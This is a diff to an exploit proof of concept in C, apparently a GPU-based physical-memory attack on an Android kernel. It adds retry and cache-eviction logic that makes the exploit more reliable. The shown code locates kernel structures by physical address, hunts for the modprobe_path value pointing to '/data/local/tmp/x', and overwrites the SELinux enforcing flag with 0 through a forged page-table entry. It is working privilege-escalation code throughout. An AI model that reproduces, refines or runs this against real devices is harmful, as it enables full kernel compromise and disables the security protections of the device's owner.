@@ -1,0 +1,63 @@
+diff --git a/poc-28663/exploit_trona.c b/poc-28663/exploit_trona.c
+index 765b407..11fdb1d 100644
+--- a/poc-28663/exploit_trona.c
++++ b/poc-28663/exploit_trona.c
+@@ -1875,7 +1875,12 @@ int main(int argc, char **argv)
+ 				 * immediately before it. */
+ 				for (__u64 p = KNOWN_INIT_TASK_PA & ~0xfffULL, first = 1; !it_base; p += 0x1000ULL, first = 0) {
+ 					__u64 pg2[512];
+-					if (!gpu_read_pa(p, pg2)) { if (first) continue; else break; }
++					int read_ok = 0;
++					for (int try = 0; try < (first ? 8 : 1) && !read_ok; try++) {
++						read_ok = gpu_read_pa(p, pg2);
++						if (!read_ok) usleep(20000);
++					}
++					if (!read_ok) { if (first) continue; else break; }
+ 					char *c = (char *)pg2;
+ 					for (int o = (first ? 0x748 : 0x20); o <= 0x1000 - 16; o += 8) {
+ 						if (memcmp(c + o, "swapper/0", 9)) continue;
+@@ -1898,11 +1903,11 @@ int main(int argc, char **argv)
+ 			__u64 enf_pa_r = 0, mp_pa_r = 0;
+ 			int won = 0;
+ 			if (rd_ok) {
+-				/* try the uniform-shift guess first (with retries for
+-				 * flaky reads), then hunt by content */
++				/* Try yacht's runtime-verified address first, content-check
++				 * it through bounded flaky-read retries, then hunt. */
+ 				{
+-					__u64 guess = 0x416e9508ULL + 0x5c000ULL;
+-					for (int try = 0; try < 4 && !mp_pa_r; try++) {
++					__u64 guess = KNOWN_MODPROBE_PA;
++					for (int try = 0; try < 12 && !mp_pa_r; try++) {
+ 						__u64 pg3[512];
+ 						if (gpu_read_pa(guess & ~0xfffULL, pg3)) {
+ 							const char *gv = (const char *)pg3 + (guess & 0xfff);
+@@ -1910,6 +1915,8 @@ int main(int argc, char **argv)
+ 							    !memcmp(gv, "/data/local/tmp/x", 17))
+ 								mp_pa_r = guess;
+ 						}
++						if (!mp_pa_r && (try == 3 || try == 7))
++							cross_cluster_evict();
+ 					}
+ 				}
+ 				for (__u64 p = 0x41600000ULL; p < 0x41860000ULL && !mp_pa_r; p += 0x1000ULL) {
+@@ -1987,9 +1994,16 @@ int main(int argc, char **argv)
+ 			if (rd_ok && read_enforce() == '1') {
+ 				{
+-					/* known PA for this build: try it before scanning */
++					/* Retry yacht's verified PA before the broad fallback scan. */
+ 					__u64 chk[512];
+-					if (gpu_read_pa(KNOWN_SELINUX_PA & ~0xfffULL, chk) &&
+-					    (unsigned)(chk[(KNOWN_SELINUX_PA & 0xfff) / 8] & 0xffffffffULL) == 1u) {
++					int known_enforcing = 0;
++					for (int try = 0; try < 12 && !known_enforcing; try++) {
++						if (gpu_read_pa(KNOWN_SELINUX_PA & ~0xfffULL, chk) &&
++						    (unsigned)(chk[(KNOWN_SELINUX_PA & 0xfff) / 8] & 0xffffffffULL) == 1u)
++							known_enforcing = 1;
++						else if (try == 3 || try == 7)
++							cross_cluster_evict();
++					}
++					if (known_enforcing) {
+ 						printf("[E3] known PA 0x%llx reads 1, writing 0\n", KNOWN_SELINUX_PA);
+ 						write_to(g_pgd + 256 * 8, (KNOWN_SELINUX_PA & ~0xfffULL) | g_mimic_fl, 7);
+ 						usleep(30000);
